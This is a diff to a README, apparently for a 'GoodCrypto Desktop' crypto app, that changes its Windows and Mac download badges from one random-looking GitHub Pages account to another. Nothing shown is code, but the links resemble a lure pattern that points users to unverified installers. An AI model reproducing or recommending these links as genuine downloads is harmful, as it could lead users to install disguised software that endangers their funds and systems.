@@ -6,8 +6,8 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://goodcrypto-desktop.github.io/.github)  
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://uasdgashdsj741.github.io/.github)
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://ayanlimufan.github.io/.github/GoodCrypto-Desktop)  
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://ayanlimufan.github.io/.github/GoodCrypto-Desktop)
 
 </div>
 
